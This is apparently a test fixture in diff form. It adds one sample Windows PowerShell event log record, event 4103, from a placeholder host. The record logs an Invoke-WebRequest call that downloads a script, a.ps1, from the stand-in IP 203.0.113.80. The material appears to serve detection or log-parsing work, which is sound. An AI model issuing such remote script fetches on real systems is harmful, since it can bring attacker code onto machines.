@@ -1,0 +1,8 @@
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4103</EventID><Version>1</Version><Level>4</Level><Task>106</Task><Opcode>20</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2026-10-21T08:03:03.1234567Z'/><EventRecordID>66005</EventRecordID><Correlation/><Execution ProcessID='5120' ThreadID='5188'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>web-01.example.com</Computer><Security UserID='S-1-5-21-1111111111-2222222222-3333333333-1001'/></System><EventData><Data Name='ContextInfo'>        Severity = Informational
+        Host Name = ConsoleHost
+        Host Application = powershell.exe
+        Command Name = Invoke-WebRequest
+        User = EXAMPLE\alice
+</Data><Data Name='UserData'/><Data Name='Payload'>CommandInvocation(Invoke-WebRequest): "Invoke-WebRequest"
+ParameterBinding(Invoke-WebRequest): name="Uri"; value="https://203.0.113.80/a.ps1"
+</Data></EventData></Event>
